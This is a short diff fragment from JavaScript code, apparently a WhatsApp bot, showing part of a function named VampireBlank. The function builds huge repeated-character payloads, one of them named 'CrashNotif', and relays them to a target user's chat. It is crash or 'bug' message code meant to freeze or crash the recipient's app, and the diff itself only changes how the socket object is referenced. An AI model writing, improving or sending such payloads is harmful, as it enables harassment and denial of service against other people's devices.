@@ -118,7 +118,7 @@ async function VampireBlank(target, ptcp = true) {
   const Vampire = `_*~@8~*_\n`.repeat(10500);
   const CrashNotif = 'ꦽ'.repeat(55555);
 
-  await global.sock.relayMessage(
+  await sock.relayMessage(
     target,
     {
       ephemeralMessage: {
